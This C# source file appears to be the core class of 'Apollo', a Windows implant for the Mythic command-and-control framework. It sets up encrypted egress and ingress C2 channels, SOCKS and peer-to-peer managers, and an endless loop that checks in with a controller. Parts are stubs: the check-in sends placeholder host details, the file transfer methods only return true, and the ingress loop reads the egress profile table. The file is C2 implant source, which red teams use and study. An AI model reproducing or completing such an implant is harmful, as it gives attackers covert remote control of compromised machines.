using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Types.Delegates;
using ApolloInterop.Classes;
using AM = Apollo.Management;
using Apollo.Api;
using Apollo;
using System.Reflection;

namespace Apollo.Agent
{
    public class Apollo : ApolloInterop.Classes.Agent
    {

        public Apollo(string uuid) : base(uuid)
        {
            Api = new Api.Api();
            C2ProfileManager = new AM.C2.C2ProfileManager(this);
            PeerManager = new AM.Peer.PeerManager(this);
            SocksManager = new AM.Socks.SocksManager(this);
            TaskManager = new AM.Tasks.TaskManager(this);

            foreach (string profileName in Config.EgressProfiles.Keys)
            {
                var map = Config.EgressProfiles[profileName];

                var crypto = CreateType(map.TCryptography, new object[] { Config.PayloadUUID, Config.StagingRSAPrivateKey });
                var serializer = CreateType(map.TSerializer, new object[] { crypto });
                var c2 = CreateType(map.TC2Profile, new object[]
                {
                    map.Parameters,
                    (ISerializer)serializer,
                    this
                });

                C2ProfileManager.AddEgress((IC2Profile)c2);
            }

            if (C2ProfileManager.GetEgressCollection().Length == 0)
            {
                throw new Exception("No egress profiles specified.");
            }

            foreach (string profileName in Config.IngressProfiles.Keys)
            {
                var map = Config.EgressProfiles[profileName];

                var crypto = CreateType(map.TCryptography, new object[] { Config.PayloadUUID, Config.StagingRSAPrivateKey });
                var serializer = CreateType(map.TSerializer, new object[] { crypto });
                var c2 = CreateType(map.TC2Profile, new object[]
                {
                    map.Parameters,
                    (ISerializer)serializer,
                    this
                });

                C2ProfileManager.AddIngress((IC2Profile)c2);
            }
        }

        public override void Start()
        {
            while (true)
            {
                if (Checkin())
                {
                    IC2Profile[] c2s = C2ProfileManager.GetConnectedEgressCollection();
                    foreach(var c2 in c2s)
                    {
                        c2.Start();
                    }
                }
            }
        }

        private bool Checkin()
        {
            CheckinMessage msg = new CheckinMessage()
            {
                Action = "checkin",
                OS = "Windows",
                User = "tester",
                Host = "test_host",
                PID = 10,
                IP = "127.0.0.1",
                UUID = UUID,
                Architecture = "x64",
                Domain = "TESTDOMAIN",
                IntegrityLevel = IntegrityLevel.HighIntegrity,
                ExternalIP = "99.99.99.99",
            };
            IC2Profile connectProfile = null;
            bool bRet = false;
            foreach(var profile in C2ProfileManager.GetEgressCollection())
            {
                try
                {
                    if (profile.Connect(msg, delegate (MessageResponse r)
                    {
                        connectProfile = profile;
                        UUID = r.UUID;
                        bRet = true;
                        return bRet;
                    }))
                    {
                        break;
                    }
                } catch(Exception ex)
                {
                    Console.WriteLine(ex);
                }
            }
            return bRet;

        }

        private object CreateType(Type t, object[] args)
        {
            var ctors = t.GetConstructors();
            return ctors[0].Invoke(args);
        }

        public override void Exit()
        {

        }

        public override bool GetFileFromMythic(TaskResponse msg, OnResponse<byte[]> onResponse)
        {
            return true;
        }


        public override bool PutFileToMythic(string taskId, byte[] file, OnResponse<string> onResponse)
        {
            return true;
        }
    }
}
